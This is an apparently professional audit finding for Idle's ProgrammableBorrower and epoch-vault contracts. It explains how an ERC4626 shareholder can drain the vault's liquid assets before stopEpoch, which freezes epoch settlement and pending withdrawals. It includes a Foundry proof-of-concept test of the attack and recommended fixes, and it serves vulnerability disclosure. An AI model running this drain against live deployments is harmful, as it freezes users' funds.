### Title
ERC4626 liquidity drain can block epoch settlement and pending withdrawals - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
An unprivileged shareholder in the programmable borrower’s ERC4626 vault can withdraw the vault’s available underlying liquidity before `stopEpoch`, leaving `ProgrammableBorrower` economically solvent but unable to fund pending withdrawals. Because `onStopEpoch` checks only `convertToAssets` coverage and then lets a failed `vault.withdraw` revert the entire stop flow, the attack temporarily freezes epoch settlement and the requested funds.

### Finding Description
`IdleCDOEpochVariant._stopEpoch` calls `onStopEpoch` before attempting to pull the pending withdrawal amount from the programmable borrower. [1](#0-0)  In minted-interest mode, `_amountToPullFromBorrower` is zero, so the amount requested is the pending-withdrawal reserve. [2](#0-1) 

`ProgrammableBorrower.onStopEpoch` compares the cash shortfall against `_currentVaultAssets`, which is the share balance converted at the vault’s aggregate price rather than currently withdrawable liquidity. [3](#0-2) [4](#0-3)  If the converted claim covers the shortfall but the external vault lacks liquid underlying, `vault.withdraw` reverts and `StopEpochVaultLiquidityUnavailable` propagates through `stopEpoch`. [5](#0-4)  The catch block in `_stopEpoch` does not catch this earlier hook failure, so the transaction reverts with `isEpochRunning` and `pendingWithdraws` unchanged. [1](#0-0) 

The existing reserve only prevents the borrower from drawing the pending amount; it does not isolate that amount from other ERC4626 shareholders draining shared vault liquidity. [6](#0-5) [7](#0-6) 

### Impact Explanation
A 5,000 USDC pending withdrawal remains unclaimable while the epoch cannot be stopped, even though the programmable borrower still owns at least 10,000 USDC of economically valuable vault shares. The freeze lasts until the external vault obtains enough withdrawable liquidity, and a sufficiently large vault user can repeat the attack whenever new liquidity becomes available. This causes temporary freezing of user funds without requiring borrower misconduct or a privileged protocol role.

### Likelihood Explanation
The attacker only needs to be a preexisting or sufficiently funded user of the same ERC4626 vault and must redeem the vault’s liquid sleeve after the withdrawal reserve is created but before the manager calls `stopEpoch`. Many ERC4626 liquidity vaults can have economically valuable but temporarily illiquid allocations, so this does not require malicious token behavior, oracle manipulation, or control of Idle protocol roles. The attack is timing-dependent but repeatable while the attacker’s remaining vault claim can consume newly available liquidity.

### Recommendation
Keep the known `epochPendingWithdraws` amount outside the shared ERC4626 position—for example, deposit only excess assets in `onStartEpoch` and retain the pending-withdrawal reserve in underlying—or otherwise move it to an isolated settlement reserve before epoch end. Additionally, bound the retryable liquidity-failure window with an explicit delayed-default or emergency-settlement path; do not replace the withdrawal attempt with unconditional `maxWithdraw` trust, because that value can be inaccurate while an actual withdrawal may still succeed.

### Proof of Concept
The following Foundry scenario uses a production-shaped ERC4626 with valuable but temporarily illiquid assets. The attacker is a legitimate vault shareholder and performs one ordinary withdrawal before the honest manager calls `stopEpoch`.

```solidity
contract LiquidityConstrainedVault is ERC20 {
    IERC20Detailed public immutable assetToken;
    address public immutable illiquidSink;

    uint256 public liquidAssets;
    uint256 public managedAssets;
    uint256 public constant LIQUIDITY_CAP = 6_000e6;

    constructor(address asset_) ERC20("Constrained Vault", "CV") {
        assetToken = IERC20Detailed(asset_);
        illiquidSink = makeAddr("illiquidSink");
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        uint256 supply = totalSupply();
        shares = supply == 0 || managedAssets == 0
            ? assets
            : assets * supply / managedAssets;

        assetToken.transferFrom(msg.sender, address(this), assets);
        managedAssets += assets;

        uint256 liquidRoom = LIQUIDITY_CAP - liquidAssets;
        uint256 keptLiquid = assets > liquidRoom ? liquidRoom : assets;
        liquidAssets += keptLiquid;
        assetToken.transfer(illiquidSink, assets - keptLiquid);

        _mint(receiver, shares);
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * managedAssets / supply;
    }

    function withdraw(
        uint256 assets,
        address receiver,
        address owner_
    ) external returns (uint256 shares) {
        require(assets <= liquidAssets, "insufficient-liquidity");
        require(owner_ == msg.sender, "not-owner");

        uint256 supply = totalSupply();
        shares = assets * supply / managedAssets;
        if (shares * managedAssets < assets * supply) shares += 1;

        managedAssets -= assets;
        liquidAssets -= assets;
        _burn(owner_, shares);
        assetToken.transfer(receiver, assets);
    }
}

function testVaultLiquidityDrainBlocksStopEpoch() external {
    LiquidityConstrainedVault constrainedVault =
        new LiquidityConstrainedVault(USDC);

    // Reuse the repository setup but initialize the programmable borrower
    // with this shared ERC4626 vault.
    _setUpProgrammableBorrowerCreditVault(
        FORK_BLOCK,
        address(constrainedVault)
    );

    address attacker = makeAddr("externalVaultUser");
    uint256 attackerSeed = 100_000 * oneScale;
    uint256 poolDeposit = 10_000 * oneScale;
    uint256 withdrawal = 5_000 * oneScale;

    // The attacker is an existing vault shareholder. Most vault assets are
    // deployed externally, while only 6,000 USDC is immediately liquid.
    deal(USDC, attacker, attackerSeed, true);
    vm.startPrank(attacker);
    IERC20Detailed(USDC).approve(address(constrainedVault), type(uint256).max);
    constrainedVault.deposit(attackerSeed, attacker);
    vm.stopPrank();

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    idleCDO.depositAA(poolDeposit);
    cdoEpoch.requestWithdraw(withdrawal, address(aaTranche));
    _startEpochAndCheckPrices(0);

    // The attacker drains all currently liquid underlying. The borrower’s
    // converted claim still covers the pending withdrawal.
    vm.prank(attacker);
    constrainedVault.withdraw(
        constrainedVault.LIQUIDITY_CAP(),
        attacker,
        attacker
    );

    assertEq(constrainedVault.liquidAssets(), 0);
    assertGe(
        constrainedVault.convertToAssets(
            constrainedVault.balanceOf(address(programmableBorrower))
        ),
        withdrawal
    );

    vm.warp(cdoEpoch.epochEndDate() + 1);

    vm.expectRevert(
        abi.encodeWithSelector(StopEpochVaultLiquidityUnavailable.selector)
    );
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    assertTrue(cdoEpoch.isEpochRunning());
    assertFalse(cdoEpoch.defaulted());
    assertEq(strategy.pendingWithdraws(), withdrawal);
    assertTrue(programmableBorrower.epochAccountingActive());
}
```

### Citations

**File:** contracts/IdleCDOEpochVariant.sol (L373-377)
```text
    uint256 _grossInterest = _isRequestingAllFunds ? _expectedInterest - _totBorrowed : _expectedInterest;
    bool _mintInterest = isInterestMinted && !_isRequestingAllFunds;
    // In minted mode IdleCDO only needs cash for withdraw requests, not for epoch interest itself.
    uint256 _amountToPullFromBorrower = _mintInterest ? 0 : _expectedInterest;
    if (_mintInterest && _interest > 1) {
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-408)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L201-216)
```text
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-253)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L350-354)
```text
  function availableToBorrow() public view returns (uint256) {
    uint256 totalAssets = underlyingToken.balanceOf(address(this)) + _currentVaultAssets();
    // Interest is minted (not pulled as cash), so only pending withdraw requests need reservation.
    uint256 reserved = epochPendingWithdraws;
    return totalAssets <= reserved ? 0 : totalAssets - reserved;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L545-549)
```text
  /// @notice Convert the current vault share position into underlying terms.
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
  }
```
